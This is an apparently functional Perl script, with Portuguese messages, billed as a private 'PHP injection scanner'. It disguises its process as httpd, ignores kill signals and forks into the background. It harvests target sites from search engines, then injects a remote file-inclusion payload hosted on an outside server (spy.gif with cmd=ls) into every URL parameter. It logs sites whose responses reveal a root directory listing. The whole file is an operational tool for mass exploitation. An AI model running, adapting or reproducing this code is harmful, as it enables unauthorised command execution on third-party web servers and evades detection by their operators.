#!/usr/bin/perl
 
use LWP::Simple;
use IO::Socket::INET;
 
 
 
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
print "\t[ PHP injection scanner 5.0 priv8 version \n\n\n";
 
if(!@ARGV[0]){
print "\t[ use: perl php5.0.pl <procura> ]\n\n";
exit;
}
print "\t[ Camuflando pid ]\n";
my $processo = "/usr/local/sbin/httpd - spy";
$SIG{"INT"} = "IGNORE";
$SIG{"HUP"} = "IGNORE";
$SIG{"TERM"} = "IGNORE";
$SIG{"CHLD"} = "IGNORE";
$SIG{"PS"} = "IGNORE";
 
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);
 
print "\t[ Pid: $pid Processo: $processo ]\n";
 
$caxe = ".";
$caxe1 = ".";
$caxe .= rand(9999);
$caxe1 .= rand(9999);
$arq = ".";
$arq = int rand(9999);
 
open(sites,">$arq");
print sites "";
close(sites);
 
 
$procura = @ARGV[0];
chomp $procura;
print "\t[ Procurando por $procura no Google ]\n";
for($n=0;$n<900;$n += 10){
$sock = IO::Socket::INET->new(PeerAddr => "www.google.com.br", PeerPort => 80, Proto => "tcp") or next;
print $sock "GET /search?q=$procura&start=$n HTTP/1.0\n\n";
print $sock "Host: www.google.com.br";
print $sock "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Netscape/7.0";
print $sock "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1";
print $sock "Accept-Language: pt-br, pt;q=0.50";
print $sock "Accept-Encoding: gzip, deflate, compress;q=0.9";
print $sock "Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66";
print $sock "Keep-Alive: 300";
print $sock "Connection: keep-alive";
 
@resu = <$sock>;
close($sock);
$ae = "@resu";
while ($ae=~ m/<a href=.*?>.*?<\/a>/){
  $ae=~ s/<a href=(.*?)>.*?<\/a>/$1/;
  $uber=$1;
   if ($uber !~/translate/)
   {
   if ($uber !~ /cache/)
   {
   if ($uber !~ /"/)
   {
   if ($uber !~ /google/)
   {
   if ($uber !~ /216/)
   {
   if ($uber =~/http/)
   {
   if ($uber !~ /start=/)
   {
     open(arq,">>$arq");
          print arq "$uber\n";
          close(arq);
}}}}}}}}}
print "\t[ Procurando por $procura no Cade   ]\n";
 
for($cadenu=1;$cadenu <= 991; $cadenu +=10){
 
@cade = get("http://cade.search.yahoo.com/search?p=$procura&ei=UTF-8&fl=0&all=1&pstart=1&b=$cadenu") or next;
$ae = "@cade";
 
while ($ae=~ m/<em class=yschurl>.*?<\/em>/){
  $ae=~ s/<em class=yschurl>(.*?)<\/em>/$1/;
  $uber=$1;
 
$uber =~ s/ //g;
$uber =~ s/<b>//g;
$uber =~ s/<\/b>//g;
 
open(a,">>$arq");
print a "$uber\n";
close(a);
}}
print "\t[ Pronto sites pegos no google e cade ]\n";
print "\t[ Excluindo os sites repetidos ]\n";
$ark = $arq;
@si = "";
open (arquivo,"<$ark");
@si = <arquivo>;
close(arquivo);
$novo ="";
foreach (@si){
if (!$si{$_})
{
$novo .= $_;
$si{$_} = 1;
}
}
open (arquivo,">$ark");
print arquivo $novo;
close(arquivo);
 
 
$a =0;
$b =0;
open(ae,"<$arq");
while(<ae>)
{$sites[$a] = $_;
  chomp $sites[$a];
  $a++;
  $b++;}
close(ae);
print "\t[ Total de sites para scanear: $a ]\n";
for ($a=0;$a<=$b;$a++){
open (file, ">$caxe");
      print file "";
close(file);
open (file, ">$caxe1");
      print file "";
close(file);
$k=0;
$e=0;
$data=get($sites[$a]) or next;
  while($data=~ m/<a href=".*?">.*?<\/a>/){
  $data=~ s/<a href="(.*?)">.*?<\/a>/$1/;
  $ubersite=$1;
 
  if ($ubersite =~/"/)
   {
   $nu = index $ubersite, '"';
   $ubersite = substr($ubersite,0,$nu);
   }
if ($ubersite !~/http/)
{$ubersite = $sites[$a].'/'.$ubersite;}
open(file,">>$caxe") || die("nao abriu caxe.txt $!");
print file "$ubersite\n";
close(file);
}
 
$lista1 = 'http://www.spykidsgroup.com/spy.gif?&cmd=ls%20/';
$t =0;
$y =0;
@ja;
open(opa,"<$caxe") or die "nao deu pra abrir o arquivo caxe.txt";
while (<opa>)
{
$ja[$t] = $_;
chomp $ja[$t];
$t++;
$y++;
}
close(opa);
$t=1;
while ($t < $y)
   {
    if ($ja[$t] =~/=/)
      {
       $num = rindex $ja[$t], '=';
       $num += 1;
       $ja[$t] = substr($ja[$t],0,$num); 
            open (jaera,">>$caxe1") or die "nao deu pra abrir ou criar caxe1.txt";
            print jaera "$ja[$t]$lista1\n";
            close(jaera);
        $num = index $ja[$t], '=';
        $num += 1;
        $ja[$t] = substr($ja[$t],0,$num);     
        $num1 = rindex $ja[$t], '.';
        $subproc = substr($ja[$t],$num1,$num);
 
            open (jaera,">>$caxe1") or die "nao deu pra abrir ou criar caxe1.txt";
            print jaera "$ja[$t]$lista1\n";
            close(jaera);
      }
     $t++;
     }
$ark = "$caxe1";
@si = "";
open (arquivo,"<$ark");
@si = <arquivo>;
close(arquivo);
$novo ="";
foreach (@si){
if (!$si{$_})
{
$novo .= $_;
$si{$_} = 1;
}
}
open (arquivo,">$ark");
print arquivo $novo;
close(arquivo);
   $q=0;
   $w=0;
    @hot;
   open (ops,"<$caxe1");
   while(<ops>)
   {
   $hot[$q] = $_;
   chomp $hot[$q];
   $q++;
   $w++;
   }
   close(ops);
print "\t[ Começando o scan aguarde. Pode demorar horas. ]\n";
for($q=0;$q<=$w;$q++)
  {
 
  if ($hot[$q] =~/http/)
    {
   $tipo=get($hot[$q]) or next;
   if($tipo =~/root/)
         {
         if ($tipo =~/etc/)
          {
          if ($tipo =~/boot/)
           {
    open(a,">>res.txt");
    print a "$hot[$q]\n";
    close(a);
                 }}}}}}
 
print "\t[ Pronto scanner concluido ]\n";
print "\t[ O resultado foi salvo no ftp do spykids ]\n"